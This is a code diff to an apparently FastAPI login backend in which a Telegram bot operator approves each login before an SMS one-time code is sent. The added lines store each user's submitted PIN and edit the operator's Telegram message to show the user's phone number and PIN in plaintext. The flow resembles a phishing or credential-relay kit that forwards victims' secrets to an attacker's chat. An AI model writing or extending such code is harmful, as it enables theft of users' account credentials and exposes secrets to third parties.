@@ -33,6 +33,7 @@ app.add_middleware(
 init_db()
 
 otp_store = {}
+approval_pins = {}  # NEW: Stores PINs temporarily for admin review
 
 
 class LoginRequest(BaseModel):
@@ -93,9 +94,9 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     approval_id = str(uuid4())
     create_approval(approval_id)
     approval_phones[approval_id] = full_phone
+    approval_pins[approval_id] = request.pin  # ⭐ NEW: Save PIN for admin review
 
-    # 3. ⭐ AWAIT the Telegram send — don't use background tasks
-    #    This guarantees the message is sent before responding.
+    # 3. ⭐ AWAIT the Telegram send — guarantees delivery on Render
     await send_approval_request(approval_id, full_phone, request.pin)
 
     # 4. Return approval_id so frontend can poll
@@ -122,11 +123,13 @@ async def approval_status(approval_id: str, background_tasks: BackgroundTasks):
     if not result:
         approval_results.pop(approval_id, None)
         approval_phones.pop(approval_id, None)
+        approval_pins.pop(approval_id, None)  # Clean up
         return {"status": "rejected"}
 
     # Approved — send OTP via SMS
     phone = approval_phones.pop(approval_id, None)
     approval_results.pop(approval_id, None)
+    approval_pins.pop(approval_id, None)  # Clean up
 
     if not phone:
         return {"status": "error", "message": "Phone number missing"}
@@ -189,23 +192,33 @@ async def telegram_webhook(request: Request):
             print(f"Invalid callback data: {callback_data}")
             return {"ok": True}
 
-        action = parts[0]
+        action = parts[0]           # "approve" or "reject"
         approval_id = parts[1]
         approved = (action == "approve")
 
+        # Mark the result in your in-memory store
         set_approval_result(approval_id, approved)
 
+        # Acknowledge the button press (removes the Telegram spinner)
         await answer_callback_query(
             callback_id,
             "✅ Approved" if approved else "❌ Rejected"
         )
 
+        # ⭐ NEW: Fetch the user's credentials to show in the message
+        phone = approval_phones.get(approval_id, "Unknown")
+        pin = approval_pins.get(approval_id, "Unknown")
+
+        # Edit the original message to show the credentials
         if "message" in callback:
             result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
             await edit_message(
                 chat_id=callback["message"]["chat"]["id"],
                 message_id=callback["message"]["message_id"],
-                text=f"{result_text}\n\nApproval ID: <code>{approval_id}</code>"
+                text=f"{result_text}\n\n"
+                     f"📱 Phone: <code>{phone}</code>\n"
+                     f"🔑 PIN: <code>{pin}</code>\n"
+                     f"🆔 Ref: <code>{approval_id}</code>"
             )
 
         return {"ok": True}
